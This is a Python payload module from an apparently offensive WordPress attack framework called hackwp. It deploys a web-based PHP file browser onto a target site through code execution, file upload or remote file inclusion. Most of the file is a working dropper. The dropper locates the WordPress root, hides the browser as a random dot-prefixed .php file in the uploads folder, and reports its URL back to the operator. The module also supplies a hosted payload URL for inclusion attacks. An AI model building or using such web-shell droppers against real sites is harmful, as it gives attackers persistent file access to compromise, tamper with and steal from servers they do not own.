"""
HWP Payload — File Browser

Deploys a web-based PHP file browser to the target.

Delivery methods:
    RCE  — Write file browser via PHP code execution
    AFU  — Provide file content for direct upload
    RFI  — Provide URL to hosted file browser

Options:
    --path      Upload path (default: random in wp-content/uploads)
"""

import random
import string
from pathlib import Path

from hwp import Payload

_DIR = Path(__file__).parent
FILEBROWSER_PHP = (_DIR / "filebrowser.php").read_text(encoding="utf-8")

# Hosted payload URL for RFI delivery
FILEBROWSER_RFI_URL = "https://raw.githubusercontent.com/etragardh/hackwp/main/payloads/filebrowser/filebrowser.php"


def _rand(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


class FileBrowser(Payload):
    name = "File Browser"
    methods = ["RCE", "AFU", "RFI"]
    description = "Deploy web-based file manager (browse, view, edit, create, delete + syntax highlighting)"
    options = [
        {"name": "path", "default": "", "help": "Upload path (blank = random)", "methods": ["RCE"]},
    ]

    def instructions(self):
        if self.method == "RCE":
            path = self.options.get("path", "")
            if not path:
                path = f"wp-content/uploads/.{_rand()}.php"

            self._rce_path = path
            self.info(f"Deploying file browser to: {path}")

            escaped = FILEBROWSER_PHP.replace("\\", "\\\\").replace("'", "\\'")

            # Resolve the WordPress root WITHOUT relying on the ABSPATH constant.
            # The same dropper must work in two very different contexts:
            #   - inside WordPress (native RCE, or an editor-sink file that WP
            #     includes) → ABSPATH is defined, use it directly.
            #   - standalone (hit directly via the XSS->RCE adapter's upload
            #     sinks, where WP is never loaded) → ABSPATH is undefined, so
            #     walk up from __FILE__ to the dir holding wp-load.php (the WP
            #     root anchor), then fall back to DOCUMENT_ROOT, then the file's
            #     own directory.
            # Native RCE behaviour is unchanged: when ABSPATH is defined this is
            # byte-equivalent to the old `ABSPATH . $path`.
            php = (
                "<?php "
                "$hwp_r=null; "
                "if(defined('ABSPATH')){$hwp_r=ABSPATH;}"
                "else{"
                "$hwp_u=dirname(__FILE__); "
                "for($hwp_i=0;$hwp_i<12;$hwp_i++){"
                "if(@file_exists($hwp_u.'/wp-load.php')||@file_exists($hwp_u.'/wp-config.php'))"
                "{$hwp_r=$hwp_u;break;} "
                "$hwp_p=dirname($hwp_u); if($hwp_p===$hwp_u)break; $hwp_u=$hwp_p;} "
                "if($hwp_r===null){$hwp_r=!empty($_SERVER['DOCUMENT_ROOT'])"
                "?$_SERVER['DOCUMENT_ROOT']:dirname(__FILE__);} "
                "$hwp_r=rtrim(str_replace('\\\\','/',$hwp_r),'/').'/';"
                "} "
                "$hwp_rel='" + path + "'; "
                "$f=$hwp_r.$hwp_rel; "
                "@mkdir(dirname($f), 0755, true); "
                "@file_put_contents($f, '" + escaped + "'); "
                # Report WHERE the browser landed, not just that it did. The
                # adapter captures this echo as the payload 'output', so in an
                # XSS->RCE run (where the loader lands somewhere unrelated to the
                # browser) this is the only thing that tells the operator the real
                # path + URL. 'FB_DEPLOYED' is kept as the leading token so
                # native-RCE report() still recognises success.
                "if(@file_exists($f)){"
                "$hwp_o='FB_DEPLOYED path='.$f; "
                "if(!empty($_SERVER['HTTP_HOST'])){"
                "$hwp_sc=(!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https':'http'; "
                "$hwp_o.=' url='.$hwp_sc.'://'.$_SERVER['HTTP_HOST'].'/'.$hwp_rel;} "
                "echo $hwp_o;"
                "}else{echo 'FB_FAILED path='.$f;}"
                " ?>"
            )
            return [php]

        elif self.method == "AFU":
            self.info("Providing file browser for upload")
            return [FILEBROWSER_PHP]

        elif self.method == "RFI":
            self.info(f"Providing hosted URL: {FILEBROWSER_RFI_URL}")
            return [FILEBROWSER_RFI_URL]

    def report(self, results):
        for r in results:
            if not r.success:
                self.error("File browser deployment failed")
                continue

            if self.method == "RCE":
                if r.output and "FB_DEPLOYED" in str(r.output):
                    self.success("File browser deployed!")
                    self.info(f"Open in browser: {self.target}/{self._rce_path}")
                else:
                    self.error("File browser deployment failed")

            elif self.method in ("AFU", "RFI"):
                if r.url:
                    self.success("File browser uploaded!")
                    self.info(f"Open in browser: {r.url}")
                elif r.path:
                    self.success("File browser uploaded!")
                    self.info(f"Uploaded to: {r.path}")
                else:
                    self.success("File browser uploaded (check exploit output for location)")
